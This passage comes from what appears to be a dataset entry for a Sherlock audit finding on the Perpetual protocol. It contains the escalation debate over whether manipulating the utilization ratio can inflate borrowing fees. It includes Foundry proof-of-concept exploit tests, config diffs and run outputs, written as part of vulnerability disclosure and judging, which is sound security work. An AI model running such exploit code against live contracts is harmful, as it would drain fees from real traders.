profit on this undeserved ratio, in the form of borrow fees, where the utilization ratio for the LP is [directly proportional](https://perp.notion.site/Borrowing-Fee-Spec-v0-8-0-22ade259889b4c30b59762d582b4336d) (`Can receive borrowing fee based on its utilization ratio`) to what percentage of the fees they're paid.\n\nAs is mentioned [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2041457466) if #133 is High, this one should be too\n\n**nirohgo**\n\n@nevillehuang . This POC proves nothing. This Watson keeps trying to pin this finding to #133 but they are essentially different.\nThe difference is that funding fee changes exponentially with utilization, while borrowing fee changes linearly up to max borrowing fee. Because of that, an attack that forces funding fee to the max can be profitable within a couple of blocks (as in #133) but an attack that tries to use the borrowing fee can not. All this POC shows is that an increase in utilization causes an increase in borrowing fee, not that that borrowing fee increase can get anywhere close to the cost of attack of make any meaningful damage in a reasonable timeframe.\n\n**IllIllI000**\n\nOne is exponential, one is linear. However, once the attacker has skewed the ratio, there's no way for the admin to do anything about it, without losing the fees themselves.\n\n**nirohgo**\n\nThe point is, how fast can the attacker make a large enough gain to cover the cost of the attack (or just inflict meaningful damage) since both rates are applied per second. In both cases the attackers create a skew that can not be held for a long time, market forces will balance it over time. But with funding rate the skew can have enough of an effect even within one block while a skew in borrowing fee will take a long time to accrue enough value, and by the time it does, the effect will be gone.\n\n**IllIllI000**\n\n1. Do you agree that eventually the fees will cover the 0.000128% cost? 2. Even if it takes a while to cover the attacker's costs, _everyone_ is _immediately_ paying these fees (a loss for them)\n\n**nirohgo**\n\n> 1. Do you agree that eventually the fees will cover the 0.000128% cost? 2. Even if it takes a while to cover the attacker's costs, _everyone_ is _immediately_ paying these fees (a loss for them)\n\nNot really. Let's take the POC you provided. If you assume there's $1,000,000 in positions that pay borrowing fee, the effect of your 1 Eth \"attack\" on the fees will add only 30 cents per day in fees. that means it will take 6666 days for these fees to cover the attack. By then whatever effect your attack had on the utilization rate/borrowing fee will have been long gone.\n\n**IllIllI000**\n\n`//borrowing fee 0.00000001 per second as in team tests` and 0.00000001 * $1,000,000 * 86400 secs/day = $864 per day paid by the position holders, for no benefit. And I'm not sure why you're counting days to cover $2k, nor where $0.30/day is coming from, when the attacker did not lose $2k - they lost $0.26\n\n**nevillehuang**\n\nBased on the discussion above, seems like some makers can profit off of other whitelisted makers for a material amount of funds. @IllIllI000 The numerical impact shown in #133 seems to be significantly higher than this issue here though, why do you think it should be high?\n\n**nirohgo**\n\n> `//borrowing fee 0.00000001 per second as in team tests` and 0.00000001 * $1,000,000 * 86400 secs/day = $864 per day paid by the position holders, for no benefit. And I'm not sure why you're counting days to cover $2k, nor where $0.30/day is coming from, when the attacker did not lose $2k - they lost $0.26\n\nYou're wrong. 0.00000001 per second is the maximum borrowing fee. The difference in fee caused by the attack is 30 cents per day. The cost of the attack is $7 (compare quote balance at end to start). to 21 days to cover the cost. Doesn't matter much because the effect is miniscule.\n\n> some makers can profit off of other whitelisted makers for a material amount of funds  \n\n@nevillehuang do explain where got that some makers can profit off of other whitelisted makers for a material amount of funds?\n\n**WangSecurity**\n\n@nirohgo can you explain where you get the 30 cents per day from? As of now, your calculations have changes from one message to another and I can't really see where the calculations come from. I'm inclined towards rejecting the escalation and leaving the issue as it is due to the PoC provided the @IllIllI000 and [this comment](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2045799032)\n\n**nirohgo**\n\n> @nirohgo can you explain where you get the 30 cents per day from? As of now, your calculations have changes from one message to another and I can't really see where the calculations come from. I'm inclined towards rejecting the escalation and leaving the issue as it is due to the PoC provided the @IllIllI000 and [this comment](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2045799032)\n\n@WangSecurity my numbers are consistent. \n\nThe 30 cents per day are based on the POC provided by the Watson, which tried to show that the attack is plausible when using small amounts (1 Eth).\n\nTo see this, add the following lines at the end of the POC function code:\n```solidity\n //added position to simulate the acumulated borrowing fee over a day\n_deposit(marketId, taker, 1000000*1e6);\nvm.prank(taker);\n clearingHouse.openPosition(\n    IClearingHouse.OpenPositionParams({\n        marketId: marketId,\n        maker: address(maker),\n        isBaseToQuote: true,\n        isExactInput: true,\n        amount: 500 * 1e18,\n        oppositeAmountBound:0,\n        deadline: block.timestamp,\n        makerData: \"\"\n    })\n);\n\nvm.warp(block.timestamp+1 days);\n\nconsole.log(\"accumulated Borrowing Fee in a day (USD, 18 decimals):\");\nint256 bfee = borrowingFee.getPendingFee(marketId,taker);\nconsole.logInt(bfee);\n```\nThis code shows how much borrowing fee is accumulated over a day when there are $1,000,000 of positions paying borrowing fee. Run the test once as is (and take note of accumulated Borrowing Fee), then comment out the attack code(starting at ` vm.startPrank(exploiter);` until the end at `vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();` and run again. The difference between the accumulated borrowing fee with and without the attack is ~0.29*10^18 or roughly 30 cents. \n\n\n\n\n\n\n\n**nirohgo**\n\nBTW @WangSecurity  here is how I got to the numbers in my original scenario (showing that the attack is not feasible with large amounts):\n> Under these assumptions:\nA. Uniswap Pool base Liquidity 1000 Eth\nB. Oracle maker Liquidity: 1M$\nC. SpotHedgeBaseMaker Liquidity: 1M$\nD. MinMarginRatio: 100%\nE. 100,000 USD open notional (that pays borrow fees) in the system.\nF. Borrow Fees (unitization rates) are rebalanced within 24 hours.\nG. max borrow fee per year: ~30% (0.00000001 per second).\nUnder the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.\nThe borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\nThe slippage loss from opening and closing the positions that push utilization rate is ~$318000\n\nThis is based on the following POC:\n1. In SpotHedgeBaseMakerForkSetup.sol replace lines 81,82 with:\n```solidity\ndeal(address(baseToken), spotLp, 1000e9, true);\ndeal(address(collateralToken), spotLp, 2000000e6, true);\n```\n(setting 1000 Eth base liquidity in Uniswap Pool)\n\n2. In SpotHedgeBaseMakerForkSetup.sol replace lines 150- 153 with:\n```solidity\ndeal(address(baseToken), address(makerLp), 500e9, true);\nvm.startPrank(makerLp);\nbaseToken.approve(address(maker), type(uint256).max);\nmaker.deposit(500e9);\n```\n(setting initial SpotHedgeBaseMaker liquidity to $1M)\n\n3. Add the following code to a test.sol file under perp-contract-v3/test/spotHedgeMaker/ : \n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// forge test --match-test testSandwich -vv\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\nimport { IUniswapV3PoolState } from \"../../src/external/uniswap-v3-core/contracts/interfaces/pool/IUniswapV3PoolState.sol\";\n\ncontract borrowFeePOC is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether);\n        oracle_maker.setValidSender(taker,true);\n        oracle_maker.setValidSender(exploiter,true);\n\n        //initial oracle maker liquidity\n        vm.startPrank(makerLp);\n         deal(address(collateralToken), makerLp,1000000*1e6, true);\n         collateralToken.approve(address(oracle_maker), type(uint256).max);\n        oracle_maker.deposit(1000000*1e6);\n        vm.stopPrank();\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n    function testBorrowRateIssue() public {\n        //set max borrow rate\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        oracle_maker.setMinMarginRatio(1 ether);\n        maker.setMinMarginRatio(1 ether);\n        \n\n        //inititalize taker/exploiter with $10M each\n        _deposit(marketId, taker, 10000000 * 1e6);\n        _deposit(marketId, exploiter, 10000000 * 1e6);\n\n        console.log(\"Exploiter Margin at start: \");\n        int256 expMargStart = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargStart);\n\n        // exploiter opens largest posible position on OM to maximize borrowing fee ($1M in this case), \n        //and a counter position of same size on SHBM.\n       vm.prank(exploiter);\n        (int256 pb, int256 pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 500 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        vm.prank(exploiter);\n        ( pb,  pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Exploiter Margin at end: \");\n        int256 expMargEnd = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargEnd);\n\n\n        //create taker position to represent $100,000 utility paying the bloated borrowing fee\n        //for a day\n        vm.startPrank(taker);\n        (  pb,    pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 50 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        //move a day forward to see how much borrow fees are collected in a day\n        vm.warp(block.timestamp + 1 days);    \n        console.log(\"accumulated Borrowing Fee in a day (USD, no decimals):\");\n        int256 bfee = borrowingFee.getPendingFee(marketId,taker);\n        console.logInt(bfee / 1e18);\n\n        //exploiter loss from slippage in the double move:\n        int256 exploiterMarginDiff = expMargEnd - expMargStart;\n        console.log(\"Cost of the exploit (USD, no decimals):\");\n        console.logInt(exploiterMarginDiff / 1e18);\n    }\n}\n```\n4. Run with `forge test --match-test testBorrowRateIssue -vv`\n\n\n**IllIllI000**\n\nI modified nirohgo's POC (search for `IllIllI` for the changes), and the output shows a profit of $861\n\n<details><summary>diff</summary>\n\n\n```diff\ndiff --git a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\nindex 66991bf..40183f1 100644\n--- a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\n+++ b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\n@@ -72,14 +72,14 @@ contract SpotHedgeBaseMakerForkSetup is ClearingHouseIntSetup {\n         baseToken = new TestCustomDecimalsToken(\"testETH\", \"testETH\", 9); // Deliberately different from WETH so we could test decimal conversions.\n         vm.label(address(baseToken), baseToken.symbol());\n \n-        uint24 spotPoolFee = 3000;\n+        uint24 spotPoolFee = 500;//500\n \n         uniswapV3B2QPath = abi.encodePacked(address(baseToken), uint24(spotPoolFee), address(collateralToken));\n \n         uniswapV3Q2BPath = abi.encodePacked(address(collateralToken), uint24(spotPoolFee), address(baseToken));\n \n-        deal(address(baseToken), spotLp, 100e9, true);\n-        deal(address(collateralToken), spotLp, 200000e6, true);\n+        deal(address(baseToken), spotLp, 1000e9, true);\n+        deal(address(collateralToken), spotLp, 2000000e6, true);\n \n         //\n         // Provision Uniswap v3 system\n@@ -147,10 +147,10 @@ contract SpotHedgeBaseMakerForkSetup is ClearingHouseIntSetup {\n         maker.setUniswapV3Path(address(baseToken), address(collateralToken), uniswapV3B2QPath);\n         maker.setUniswapV3Path(address(collateralToken), address(baseToken), uniswapV3Q2BPath);\n \n-        deal(address(baseToken), address(makerLp), 1e9, true);\n+        deal(address(baseToken), address(makerLp), 500e9, true);\n         vm.startPrank(makerLp);\n         baseToken.approve(address(maker), type(uint256).max);\n-        maker.deposit(1e9);\n+        maker.deposit(500e9);\n         vm.stopPrank();\n     }\n \ndiff --git a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerIntSetup.sol b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerIntSetup.sol\nindex 3b0b850..6b1f185 100644\n--- a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerIntSetup.sol\n+++ b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerIntSetup.sol\n@@ -21,7 +21,7 @@ contract SpotHedgeBaseMakerIntSetup is ClearingHouseIntSetup {\n     FakeUniswapV3Factory public uniswapV3Factory;\n     FakeUniswapV3Quoter public uniswapV3Quoter;\n \n-    uint24 public spotPoolFee = 3000;\n+    uint24 public spotPoolFee = 500; //500\n     address public spotPool = makeAddr(\"SpotPool\");\n \n     bytes public uniswapV3B2QPath;\ndiff --git a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerSpecSetup.sol b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerSpecSetup.sol\nindex 1e31111..7ed52ce 100644\n--- a/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerSpecSetup.sol\n+++ b/perp-contract-v3/test/spotHedgeMaker/SpotHedgeBaseMakerSpecSetup.sol\n@@ -32,8 +32,8 @@ contract SpotHedgeBaseMakerSpecSetup is MockSetup {\n         quoteToken = new TestCustomDecimalsToken(\"USDC\", \"USDC\", 6);\n         vm.label(address(quoteToken), quoteToken.symbol());\n \n-        uniswapV3B2QPath = abi.encodePacked(address(baseToken), uint24(3000), address(quoteToken));\n-        uniswapV3Q2BPath = abi.encodePacked(address(quoteToken), uint24(3000), address(baseToken));\n+        uniswapV3B2QPath = abi.encodePacked(address(baseToken), uint24(500), address(quoteToken)); // 500\n+        uniswapV3Q2BPath = abi.encodePacked(address(quoteToken), uint24(500), address(baseToken)); // 500\n \n         vm.mockCall(\n             mockConfig,\n@@ -73,7 +73,7 @@ contract SpotHedgeBaseMakerSpecSetup is MockSetup {\n                 IUniswapV3Factory.getPool.selector,\n                 address(baseToken),\n                 address(quoteToken),\n-                uint24(3000)\n+                uint24(500)//500\n             ),\n             abi.encode(uniswapV3SpotPool)\n         );\n@@ -83,7 +83,7 @@ contract SpotHedgeBaseMakerSpecSetup is MockSetup {\n                 IUniswapV3Factory.getPool.selector,\n                 address(quoteToken),\n                 address(baseToken),\n-                uint24(3000)\n+                uint24(500)//500\n             ),\n             abi.encode(uniswapV3SpotPool)\n         );\n\n```\n\n\n</details>\n\n<details><summary>test</summary>\n\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// forge test --match-test testSandwich -vv\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract borrowFeePOC is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        config.setFundingConfig(marketId, 1, 1, address(oracle_maker));\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether);\n        oracle_maker.setValidSender(taker,true);\n        oracle_maker.setValidSender(exploiter,true);\n\n        //initial oracle maker liquidity\n        vm.startPrank(makerLp);\n         deal(address(collateralToken), makerLp,1000000*1e6, true);\n         collateralToken.approve(address(oracle_maker), type(uint256).max);\n        oracle_maker.deposit(1000000*1e6);\n        vm.stopPrank();\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n    function testBorrowRateIssue() public {\n        //set max borrow rate\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        oracle_maker.setMinMarginRatio(1 ether);\n        maker.setMinMarginRatio(1 ether);\n        \n\n        //inititalize taker/exploiter with $10M each\n        _deposit(marketId, taker, 10000000 * 1e6);\n        _deposit(marketId, exploiter, 10000000 * 1e6);\n\n        console.log(\"Exploiter Margin at start: \");\n        int256 expMargStart = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargStart);\n\n        // exploiter opens largest posible position on OM to maximize borrowing fee ($1M in this case), \n        //and a counter position of same size on SHBM.\n       vm.prank(exploiter);\n        (int256 pb, int256 pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                //amount: 500 * 1e18,\n                amount: 0.6 * 1e18, // IllIllI\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        vm.prank(exploiter);\n        ( pb,  pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Exploiter Margin at end: \");\n        int256 expMargEnd = vault.getMargin(marketId,address(exploiter));\n        console.logInt(expMargEnd);\n\n\n        //create taker position to represent $100,000 utility paying the bloated borrowing fee\n        //for a day\n        vm.startPrank(taker);\n        (  pb,    pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                //amount: 50 * 1e18,\n                amount: 500 * 1e18, // IllIllI\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        //move a day forward to see how much borrow fees are collected in a day\n        vm.warp(block.timestamp + 1 days);    \n        console.log(\"accumulated Borrowing Fee in a day (USD, no decimals):\");\n        int256 bfee = borrowingFee.getPendingFee(marketId,taker);\n        console.logInt(bfee / 1e18);\n\n        //exploiter loss from slippage in the double move:\n        int256 exploiterMarginDiff = expMargEnd - expMargStart;\n        console.log(\"Cost of the exploit (USD, no decimals):\");\n        console.logInt(exploiterMarginDiff / 1e18);\n    }\n}\n```\n\n\n</details>\n\nThe output shows:\n```text\nRan 1 test for test/spotHedgeMaker/test.sol:borrowFeePOC\n[PASS] testBorrowRateIssue() (gas: 2669547)\nLogs:\n  Exploiter Margin at start: \n  10000000000000000000000000\n  Exploiter Margin at end: \n  9999998681150000000000000\n  accumulated Borrowing Fee in a day (USD, no decimals):\n  862\n  Cost of the exploit (USD, no decimals):\n  -1\n```\n\n**WangSecurity**\n\nAt this point, I believe the issue is valid and should remain as it is. Planning to reject the escalation. \n\nIf I'm missing anything here that can invalidate the submitter's POC, please tag me.\n\n**nirohgo**\n\n> At this point, I believe the issue is valid and should remain as it is. Planning to reject the escalation.\n> \n> If I'm missing anything here that can invalidate the submitter's POC, please tag me.\n\n@WangSecurity Try running the POC. The real output with the change (changing the uni pool fee tier to 500) is this:\nLogs:\n  Exploiter Margin at start: \n  10000000000000000000000000\n  Exploiter Margin at end: \n  9666444407395000000000000\n  accumulated Borrowing Fee in a day (USD, no decimals):\n  86\n  Cost of the exploit (USD, no decimals):\n  -333555\n\n**WangSecurity**\n\nI've run both PoCs and I can see that the one provided by @IllIllI000 indeed has a profit of 862 and a loss of 4. Hence, I believe it is a valid attack under certain factors and conditions, therefore, planning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity just noticed @IllIllI000 also changed the values in the test function. The results he presented are wrong. 862 is the total borrowing fee accumulated over a day. the number you should look at is the difference between borrowing fees with or without the attack (by running again commenting out the attack part as with the change I've make to the 30 cents POC). You'll see that with the new numbers @IllIllI000 presented the attack doesn't add anything to accumulated borrowing fees (in fact without the attack accumulated fees are 864). \n\n**WangSecurity**\n\nIn fact, I didn't make any changes that @IllIllI000 describes [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2070448795) in the `diff` part. I've only changed the `test.sol` file itself, so the only changes between your test and @IllIllI000 test is the amount of opening position (from 500e18 to 0.6e18 for the exploiter and from 50e18 to 500e18 for taker). That is why the output I've got was 864 and not 862 as @IllIllI000 showed. Therefore, as I understand the attack is profitable only if there are different position sizes and that's it.\n\n**nirohgo**\n\n> In fact, I didn't make any changes that @IllIllI000 describes [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126#issuecomment-2070448795) in the `diff` part. I've only changed the `test.sol` file itself, so the only changes between your test and @IllIllI000 test is the amount of opening position (from 500e18 to 0.6e18 for the exploiter and from 50e18 to 500e18 for taker). That is why the output I've got was 864 and not 862 as @IllIllI000 showed. Therefore, as I understand the attack is profitable only if there are different position sizes and that's it.\n\nThe attack is not profitable because neither 864 nor 862 are the profits of this attack. As I explained, this is the total borrowing fees accumulated over a day when there's 500e18 of paying positions. You need to look at the difference between the accumulated fees with and without the attack to tell exactly how the attack affected the accumulated fees. Make that comparison and you'll see that the attack is not viable. \n\n**WangSecurity**\n\n@nirohgo by running without the attack, you mean to comment out these specific part of the PoC? (confirmation to understand I'm running everything correctly):\n\n```solidity\n       vm.prank(exploiter);\n        (int256 pb, int256 pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 500 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        vm.prank(exploiter);\n        ( pb,  pq) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n```\n\n**nirohgo**\n\n\n\n@WangSecurity You are comparing apples to oranges. You need to run @IllIllI000 's POC once with the attack code:\n```solidity\nvm.prank(exploiter);\n  (int256 pb, int256 pq) = clearingHouse.openPosition(\n      IClearingHouse.OpenPositionParams({\n          marketId: marketId,\n          maker: address(oracle_maker),\n          isBaseToQuote: false,\n          isExactInput: false,\n          //amount: 500 * 1e18,\n          amount: 0.6 * 1e18, // IllIllI\n          oppositeAmountBound:type(uint256).max,\n          deadline: block.timestamp,\n          makerData: \"\"\n      })\n  );\n  int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n  vm.prank(exploiter);\n  ( pb,  pq) = clearingHouse.openPosition(\n      IClearingHouse.OpenPositionParams({\n          marketId: marketId,\n          maker: address(maker),\n          isBaseToQuote: true,\n          isExactInput: true,\n          amount: exploiterPosSize.abs(),\n          oppositeAmountBound:0,\n          deadline: block.timestamp,\n          makerData: \"\"\n      })\n        );\n```\nand once with this code commented out and see the difference in accumulated borrowing fees. Again, 862 is **not** the profit of this attack. If you don't interpret the POC correctly you'll be making a judgment based on false data.\n\n**WangSecurity**\n\nI understand, I just wanted to get a confirmation that I correctly run without the attack. Indeed, without the attack @IllIllI000 has $864 fees accumulated in a day and with the attack the accumulated fees drop down to $862. Even if we change the taker's `amount: 500 * 1e18,` back to `amount: 50 * 1e18,` total accumulated fees in a day without the attack are $8 and with the attack it's $9 and the cost is $4. Therefore, I see that the attack path is indeed not viable. I'll let @IllIllI000 to come in and correct us if need and will give my final decision a bit later today. Thank you @nirohgo for the clarification.\n\n**nirohgo**\n\n> I understand, I just wanted to get a confirmation that I correctly run without the attack. Indeed, without the attack @IllIllI000 has $864 fees accumulated in a day and with the attack the accumulated fees drop down to $862. Even if we change the taker's `amount: 500 * 1e18,` back to `amount: 50 * 1e18,` total accumulated fees in a day without the attack are $8 and with the attack it's $9 and the cost is $4. Therefore, I see that the attack path is indeed not viable. I'll let @IllIllI000 to come in and correct us if need and will give my final decision a bit later today. Thank you @nirohgo for the clarification.\n\n@WangSecurity thanks for dedicating attention to this.\n\n**IllIllI000**\n\n@WangSecurity It feels as though nirohgo keeps changing numbers and moving the goal post, and the net effect is that I'm DOSed. The submission is `Borrow fees can be arbitrarily increased without the maker providing any value` and in your analysis you see that the cost increases by a dollar, without providing any value. I'm not familiar with these tests, so it's extremely time-consuming to fiddle with them to try to satisfy nirohgo's complaints, but the fact remains that an attacker, if they do not care about losses (Sherlock rules for a Med do _not_ require a profit) is able to increase fees without providing any value. Even with your example, after five days (e.g. in an illiquid market, or a market where most of the trades happen between traders rather than the whitelisted makers), they'll have a profit, because it's a per-day effect.\n\n**nirohgo**\n\n> @WangSecurity It feels as though nirohgo keeps changing numbers and moving the goal post, and the net effect is that I'm DOSed. The submission is `Borrow fees can be arbitrarily increased without the maker providing any value` and in your analysis you see that the cost increases by a dollar, without providing any value. I'm not familiar with these tests, so it's extremely time-consuming to fiddle with them to try to satisfy nirohgo's complaints, but the fact remains that an attacker, if they do not care about losses (Sherlock rules for a Med do _not_ require a profit) is able to increase fees without providing any value. Even with your example, after five days (e.g. in an illiquid market, or a market where most of the trades happen between traders rather than the whitelisted makers), they'll have a profit, because it's a per-day effect.\n\n@WangSecurity I believe going over the comments history here is enough to see that @IllIllI000 is the one trying to twist numbers around to try and find a viable attack here but keeps failing, I've shown clearly that this attack is not viable not when using large amounts (my original POC) nor with small amounts (the alternatives @IllIllI000 provided). I believe enough of everyone's time has been wasted on these attempts and it's been made clear that this is not a viable attack.\n\n**WangSecurity**\n\n@IllIllI000 need clarification from your side: even if the attack has a significant cost to manipulate and increase the borrowing fee, the borrowing fee will remain the same and the attacker will gain value over time, correct? I.e. after running the PoC with one set of values, the total accumulated fees in a day changed from $8 to $9 with -$4 as the cost for an attack, but these $9 total accumulated fees in a day will not drop down to $8 and with time the attacker will come out profittable?\n\n**IllIllI000**\n\n@WangSecurity assuming nothing changes with the position, that is correct - the new per-day rate will be $9 in perpetuity\n\n**WangSecurity**\n\nAlthough the attack isn't guaranteed to be profitable, it's possible. However, the negatively affected accounts are a certainty. \n\nPlanning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n> @IllIllI000 need clarification from your side: even if the attack has a significant cost to manipulate and increase the borrowing fee, the borrowing fee will remain the same and the attacker will gain value over time, correct? I.e. after running the PoC with one set of values, the total accumulated fees in a day changed from $8 to $9 with -$4 as the cost for an attack, but these $9 total accumulated fees in a day will not drop down to $8 and with time the attacker will come out profittable?\n\nThat is incorrect. Any imbalance created by this \"attack\" will surely get by other positions due to market forces.\n\n\n**IllIllI000**\n\nI'd also like to point out that this can happen organically, with traders just normally opening and closing their positions. There doesn't have to be any attacker for the extra fees to be charged\n\n**Evert0x**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nirohgo](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126/#issuecomment-2041333052): rejected",
      "summary": "\nThis bug report is about a vulnerability found in the SpotHedgeBaseMaker LPs in the protocol. This allows them to increase their LP returns without providing any value, by closing their trades against other whitelisted makers. This can be done by manipulating the utilization ratio and opening and closing positions against the OracleMaker. This can lead to excessive fees being charged, affecting traders on the other side of the position. The code snippet provided shows how the utilization ratio is calculated and how it can be manipulated. The impact of this vulnerability is value extraction at the expense of other traders. The report includes a discussion between different parties about the viability of this attack, with some concluding that it is not viable but others arguing that it can still happen organically. The result of the report is classified as Medium and Unique, and the issue has been resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "32172",
      "title": "M-9: No slippage control on maker LP `deposit()`/`withdraw()`",
      "impact": "MEDIUM",
